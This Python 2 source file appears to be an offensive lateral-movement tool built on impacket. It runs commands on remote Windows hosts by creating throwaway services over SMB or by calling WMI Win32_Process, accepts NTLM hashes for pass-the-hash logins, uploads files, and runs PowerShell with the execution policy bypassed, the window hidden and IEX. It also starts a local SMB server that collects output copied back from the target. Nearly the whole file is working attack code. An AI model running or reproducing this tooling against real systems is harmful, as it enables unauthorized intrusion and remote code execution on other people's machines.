#!/usr/bin/env python2
from impacket import smbserver, ntlm
from impacket.dcerpc.v5 import transport, scmr
from impacket.dcerpc.v5.dcomrt import DCOMConnection
from impacket.dcerpc.v5.dcom import wmi
from impacket.dcerpc.v5.dtypes import NULL
from impacket.smbconnection import *
import argparse
import time
import ConfigParser
import traceback
import random
import sys
import os
import string

PERM_DIR = ''.join(random.sample(string.ascii_letters, 10))
OUTPUT_FILENAME = ''.join(random.sample(string.ascii_letters, 10))
BATCH_FILENAME  = ''.join(random.sample(string.ascii_letters, 10)) + '.bat'
SMBSERVER_DIR   = ''.join(random.sample(string.ascii_letters, 10))
DUMMY_SHARE     = 'TMP'

class SMBServer():
    def __init__(self):
        if os.geteuid() != 0:
            raise('[!] Error: ** SMB Server must be run as root **')

    def cleanup_server(self):
        print '[*] Cleaning up..'
        try:
            os.unlink(SMBSERVER_DIR + '/smb.log')
        except:
            pass
        os.rmdir(SMBSERVER_DIR)

    def run(self):
        # Here we write a mini config for the server
        smbConfig = ConfigParser.ConfigParser()
        smbConfig.add_section('global')
        smbConfig.set('global','server_name','server_name')
        smbConfig.set('global','server_os','UNIX')
        smbConfig.set('global','server_domain','WORKGROUP')
        smbConfig.set('global','log_file',SMBSERVER_DIR + '/smb.log')
        smbConfig.set('global','credentials_file','')

        # Let's add a dummy share
        smbConfig.add_section(DUMMY_SHARE)
        smbConfig.set(DUMMY_SHARE,'comment','')
        smbConfig.set(DUMMY_SHARE,'read only','no')
        smbConfig.set(DUMMY_SHARE,'share type','0')
        smbConfig.set(DUMMY_SHARE,'path',SMBSERVER_DIR)

        # IPC always needed
        smbConfig.add_section('IPC$')
        smbConfig.set('IPC$','comment','')
        smbConfig.set('IPC$','read only','yes')
        smbConfig.set('IPC$','share type','3')
        smbConfig.set('IPC$','path')

        self.smb = smbserver.SMBSERVER(('0.0.0.0',445), config_parser = smbConfig)
        print '[*] Creating tmp directory'
        try:
            os.mkdir(SMBSERVER_DIR)
        except Exception, e:
            print '[!]', e
            pass
        print '[*] Setting up SMB Server'
        self.smb.processConfigFile()
        print '[*] Ready to listen...'
        try:
            self.smb.serve_forever()
        except:
            pass

    def stop(self):
        self.cleanup_server()
        self.smb.socket.close()
        self.smb.server_close()

class RemoteShellsmbexec():
    def __init__(self, share, rpc, mode, serviceName, command):
        self.__share = share
        self.__mode = mode
        self.__output = '\\Windows\\Temp\\' + OUTPUT_FILENAME 
        self.__batchFile = '%TEMP%\\' + BATCH_FILENAME 
        self.__outputBuffer = ''
        self.__command = command
        self.__shell = '%COMSPEC% /Q /c '
        self.__serviceName = serviceName
        self.__rpc = rpc
        self.__scmr = rpc.get_dce_rpc()

        try:
            self.__scmr.connect()
        except Exception as e:
            print "[!] {}".format(e)
            raise

        s = rpc.get_smb_connection()

        # We don't wanna deal with timeouts from now on.
        s.setTimeout(100000)
        if mode == 'SERVER':
            myIPaddr = s.getSMBServer().get_socket().getsockname()[0]
            self.__copyBack = 'copy %s \\\\%s\\%s' % (self.__output, myIPaddr, DUMMY_SHARE)

        try:
            self.__scmr.bind(scmr.MSRPC_UUID_SCMR)
            resp = scmr.hROpenSCManagerW(self.__scmr)
            self.__scHandle = resp['lpScHandle']
            self.transferClient = rpc.get_smb_connection()
        except Exception as e:
            print "[-] {}".format(e)

    def set_copyback(self):
        s = self.__rpc.get_smb_connection()
        s.setTimeout(100000)
        myIPaddr = s.getSMBServer().get_socket().getsockname()[0]
        self.__copyBack = 'copy %s \\\\%s\\%s' % (self.__output, myIPaddr, DUMMY_SHARE)

    def finish(self):
        # Just in case the service is still created
        try:
           self.__scmr = self.__rpc.get_dce_rpc()
           self.__scmr.connect() 
           self.__scmr.bind(svcctl.MSRPC_UUID_SVCCTL)
           resp = scmr.hROpenSCManagerW(self.__scmr)
           self.__scHandle = resp['lpScHandle']
           resp = scmr.hROpenServiceW(self.__scmr, self.__scHandle, self.__serviceName)
           service = resp['lpServiceHandle']
           scmr.hRDeleteService(self.__scmr, service)
           scmr.hRControlService(self.__scmr, service, scmr.SERVICE_CONTROL_STOP)
           scmr.hRCloseServiceHandle(self.__scmr, service)
        except Exception, e:
           pass

    def get_output(self):
        def output_callback(data):
            self.__outputBuffer += data

        if self.__mode == 'SHARE':

            #while True:
             #   try:
            self.transferClient.getFile(self.__share, self.__output, output_callback)
             #       break
             #   except Exception, e:
             #       if "STATUS_OBJECT_NAME_NOT_FOUND" in str(e):
             #           time.sleep(1)
             #           pass
             #       else:
             #           print str(e)
             #           pass 
            self.transferClient.deleteFile(self.__share, self.__output)

        else:
            fd = open(SMBSERVER_DIR + '/' + OUTPUT_FILENAME,'r')
            output_callback(fd.read())
            fd.close()
            os.unlink(SMBSERVER_DIR + '/' + OUTPUT_FILENAME)

    def execute_remote(self, data):
        command = self.__shell + 'echo ' + data + ' ^> ' + self.__output + ' 2^>^&1 > ' + self.__batchFile + ' & ' + self.__shell + self.__batchFile 
        if self.__mode == 'SERVER':
            command += ' & ' + self.__copyBack
        command += ' & ' + 'del ' + self.__batchFile

        try:
            resp = scmr.hRCreateServiceW(self.__scmr, self.__scHandle, self.__serviceName, self.__serviceName, lpBinaryPathName=command)
            service = resp['lpServiceHandle']
        except:
            return

        try:
           scmr.hRStartServiceW(self.__scmr, service)
        except:
           pass
        scmr.hRDeleteService(self.__scmr, service)
        scmr.hRCloseServiceHandle(self.__scmr, service)
        self.get_output()

    def send_data(self, data):
        self.execute_remote(data)
        result = self.__outputBuffer
        self.__outputBuffer = ''
        return result

class CMDEXEC:
    KNOWN_PROTOCOLS = {
        '139/SMB': (r'ncacn_np:%s[\pipe\svcctl]', 139),
        '445/SMB': (r'ncacn_np:%s[\pipe\svcctl]', 445),
        }


    def __init__(self, protocols = None,  username = '', password = '', domain = '', hashes = '', share = None, command= None):
        if not protocols:
            protocols = CMDEXEC.KNOWN_PROTOCOLS.keys()

        self.__username = username
        self.__password = password
        self.__protocols = [protocols]
        self.__serviceName = self.service_generator()
        self.__domain = domain
        self.__command = command
        self.__lmhash = ''
        self.__nthash = ''
        self.__aesKey = None
        self.__doKerberos = None
        self.__share = share
        self.__mode  = 'SHARE'
        if hashes:
            self.__lmhash, self.__nthash = hashes.split(':')

    def service_generator(self, size=6, chars=string.ascii_uppercase):
        return ''.join(random.choice(chars) for _ in range(size))

    def run(self, addr):
        result = ''
        for protocol in self.__protocols:
            protodef = CMDEXEC.KNOWN_PROTOCOLS[protocol]
            port = protodef[1]

            stringbinding = protodef[0] % addr
            rpctransport = transport.DCERPCTransportFactory(stringbinding)
            rpctransport.set_dport(port)
            
            if hasattr(rpctransport,'preferred_dialect'):
               rpctransport.preferred_dialect(SMB_DIALECT)

            if hasattr(rpctransport, 'set_credentials'):
                # This method exists only for selected protocol sequences.
                rpctransport.set_credentials(self.__username, self.__password, self.__domain, self.__lmhash, self.__nthash, self.__aesKey)
            try:
                self.shell = RemoteShellsmbexec(self.__share, rpctransport, self.__mode, self.__serviceName, self.__command)
                result = self.shell.send_data(self.__command)
            except SessionError as e:
                if 'STATUS_SHARING_VIOLATION' in str(e):
                    return
                else:
                    print "[-] {}".format(e)

            except  (Exception, KeyboardInterrupt), e:
                print e
                traceback.print_exc()
                self.shell.finish()
                sys.stdout.flush()
                # sys.exit(1)

        return result

class WMIEXEC:
    def __init__(self, command = '', username = '', password = '', domain = '', hashes = '', share = None, noOutput=True):
        self.__command = command
        self.__username = username
        self.__password = password
        self.__domain = domain
        self.__lmhash = ''
        self.__nthash = ''
        self.__aesKey = None
        self.__share = share
        self.__noOutput = noOutput
        self.__doKerberos = False
        if hashes:
            self.__lmhash, self.__nthash = hashes.split(':')

    def run(self, addr, smbConnection):
        result = ''
        dcom = DCOMConnection(addr, self.__username, self.__password, self.__domain, self.__lmhash, self.__nthash, self.__aesKey, oxidResolver = True, doKerberos=self.__doKerberos)
        iInterface = dcom.CoCreateInstanceEx(wmi.CLSID_WbemLevel1Login,wmi.IID_IWbemLevel1Login)
        iWbemLevel1Login = wmi.IWbemLevel1Login(iInterface)
        iWbemServices= iWbemLevel1Login.NTLMLogin('//./root/cimv2', NULL, NULL)
        iWbemLevel1Login.RemRelease()

        win32Process,_ = iWbemServices.GetObject('Win32_Process')

        try:
            self.shell = RemoteShellwmi(self.__share, win32Process, smbConnection)
            result = self.shell.send_data(self.__command)
        except  (Exception, KeyboardInterrupt), e:
            traceback.print_exc()
            dcom.disconnect()
            sys.stdout.flush()

        dcom.disconnect()

        return result

class RemoteShellwmi():
    def __init__(self, share, win32Process, smbConnection):
        self.__share = share
        self.__output = '\\' + OUTPUT_FILENAME 
        self.__outputBuffer = ''
        self.__shell = 'cmd.exe /Q /c '
        self.__win32Process = win32Process
        self.__transferClient = smbConnection
        self.__pwd = 'C:\\'
        self.__noOutput = False

        # We don't wanna deal with timeouts from now on.
        if self.__transferClient is not None:
            self.__transferClient.setTimeout(100000)
        else:
            self.__noOutput = True

    def get_output(self):
        def output_callback(data):
            self.__outputBuffer += data

        if self.__noOutput is True:
            self.__outputBuffer = ''
            return

        while True:
            try:
                self.__transferClient.getFile(self.__share, self.__output, output_callback)
                break
            except Exception, e:
                if "STATUS_SHARING_VIOLATION" in str(e):
                    time.sleep(1)
                    pass
                else:
                    #print str(e)
                    pass 
        self.__transferClient.deleteFile(self.__share, self.__output)

    def execute_remote(self, data):
        command = self.__shell + data
        if self.__noOutput is False:
            command += ' 1> ' + '\\\\127.0.0.1\\%s' % self.__share + self.__output  + ' 2>&1'
        obj = self.__win32Process.Create(command, self.__pwd, None)
        self.get_output()

    def send_data(self, data):
        self.execute_remote(data)
        result = self.__outputBuffer
        self.__outputBuffer = ''
        return result


def upload_file(smbconn, host, src, dst):
    dst = string.replace(dst,'/','\\')
    dst = os.path.normpath(dst)
    dst = dst.split('\\')
    share = dst[0].replace(':', '$')
    dst = '\\'.join(dst[1:])

    if os.path.exists(src):
        print '[+] Starting upload: %s (%s bytes)' % (src, os.path.getsize(src))
        upFile = open(src, 'rb')
        try:
            smbconn.putFile(share, dst, upFile.read)
            print '[+] Upload completed'
            upFile.close()
            return True 
        except Exception as e:
            print '[!]', e
            print '[!] Error uploading file, you need to include destination file name in the path'
            upFile.close() 
    else:
        print '[!] Invalid source. File does not exist'
    return False

def connect(host, port, user, passwd, hash, share, file_to_upload, src_folder, dst_folder, command, domain="workgroup", execm="smbexec"):
    try:
        smb = SMBConnection(host, host, None, port, timeout=2)
        try:
            smb.login('' , '')
        except SessionError as e:
            if "STATUS_ACCESS_DENIED" in e.message:
                pass

        print "[+] {}:{} is running {} (name:{}) (domain:{})".format(host, port, smb.getServerOS(), smb.getServerName(), domain)

        if file_to_upload:
            # execute exe file
            if len(file_to_upload) == 1:
                command = '"%s"' % file_to_upload[0]
            
            # execute ps1 file
            else:
                command = 'powershell.exe -ExecutionPolicy Bypass -windowstyle hidden /c "cat %s | Out-String | IEX"' % (dst_folder + file_to_upload[0])

        if command:
            try:
                lmhash = ''
                nthash = ''
                if hash:
                    lmhash, nthash = hash.split(':')

                smb.login(user, passwd, domain, lmhash, nthash)

                if file_to_upload:
                    for file in file_to_upload:
                        if upload_file(smb, host, src_folder + file, dst_folder + file):
                            os.remove(src_folder + file)
                
                if command:
                    if execm == 'smbexec':
                        executer = CMDEXEC('{}/SMB'.format(port), user, passwd, domain, hash, share, command)
                        result = executer.run(host)

                    elif execm == 'wmi':
                        executer = WMIEXEC(command, user, passwd, domain, hash, share)
                        result = executer.run(host, smb)
                    
                    if result: print result

                smb.logoff()

            except SessionError as e:
                print "[-] {}:{} {}".format(host, port, e)
            except Exception as e:
                print "[-] {}:{} {}".format(host, port, e)

    except Exception as e:
        print "[!] {}".format(e)
            
